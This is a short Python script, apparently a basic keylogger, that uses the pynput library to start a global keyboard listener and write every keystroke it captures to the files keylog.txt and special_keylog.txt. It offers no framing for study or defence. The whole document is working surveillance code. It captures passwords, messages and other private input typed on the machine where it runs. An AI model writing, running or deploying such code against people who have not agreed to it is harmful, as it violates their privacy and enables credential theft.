from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logkey:
        try:
           char = key.char
           logkey.write(char)
        except AttributeError:
            with open("special_keylog.txt", 'a') as special_key:
                special_key.write('Special key {0} pressed, '.format(key))



if __name__=="__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    # Use an infinite loop to keep the program running
    input()